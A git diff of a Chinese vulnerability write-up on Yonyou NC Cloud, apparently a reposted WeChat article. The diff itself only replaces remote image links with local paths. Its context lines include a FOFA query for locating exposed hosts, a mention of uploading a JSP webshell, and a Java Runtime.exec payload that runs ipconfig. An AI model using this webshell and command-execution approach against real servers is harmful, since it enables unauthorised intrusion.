@@ -57,7 +57,7 @@ NC Cloud 是用友推出的大型企业数字化平台。用友网络科技股�
 
 **影响版本**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVycxaw03LaQHib0E68oSXe0JiacEpbkEk3VOQliankS63f8EaLfchtgGxibBHLT4ccPRxVphJ9Af9OL8A/640?wx_fmt=png)
+![](../../.resource/remote/4b8f0de65a26bccad08e00c86a5981180799c0ec2eae8b6e62d119badc35d6c8.png)
 
 **FOFA 语句**
 
@@ -66,13 +66,13 @@ app="用友-NC-Cloud"
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVycxaw03LaQHib0E68oSXe0JIT7VAvAfNh3iacia0egTBpGWkxiboP2qw2wia9Vh0HAQbmCwj11cDicxP4g/640?wx_fmt=png)
+![](../../.resource/remote/15af9c97f97ee015983876a86f61588910844c0dc751e115a43f7685c6fc2b20.png)
 
 **漏洞复现**
 
 抓包如下：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVycxaw03LaQHib0E68oSXe0JzRXhRiauEAOnak1sBcAfHOG1xefqiapWMT6JPpv9Cob4TBVAK2mLtbOA/640?wx_fmt=png)
+![](../../.resource/remote/32edfe0efd127f24241917084baace132ca610a2ed4809db2d3101777bf9beb9.png)
 
 上传 123456789.jsp 的 webshell
 
@@ -93,7 +93,7 @@ Content-Type: application/x-www-form-urlencoded
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVycxaw03LaQHib0E68oSXe0Jhv81DvrpibqjCKvEkmHGUM5GyoibPFvNqpicmsOZQZftib4LXmIibbQqTibA/640?wx_fmt=png)
+![](../../.resource/remote/f0290a821591b26f6301792060aded71bf3d4f532fdfa1b063149348049983c7.png)
 
 执行 ipconfig 命令
 
@@ -114,13 +114,13 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVycxaw03LaQHib0E68oSXe0JEhbws6BpDuyLuFBXENLQM8CsJR2C8lOstHd9DvURdx1R6TWDVCOS9A/640?wx_fmt=png)
+![](../../.resource/remote/e4867ea96564fc26114019124ff77ad31b93c43d1bef5f6bb6187ae08d9d1a46.png)
 
 **修复建议**
 
 建议升级至最新版本
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYa0PicnDzIv4xibegRTm4976s4ZMcq0Ke9uH8TG8RqC4ZbaXK33IrmicxA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)  
+![](../../.resource/remote/a42c9c7ebb117f1b9d9d8da381ddae972cc83b939df4fabf72bbb68309698bca.jpg)  
 
 **本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**
 
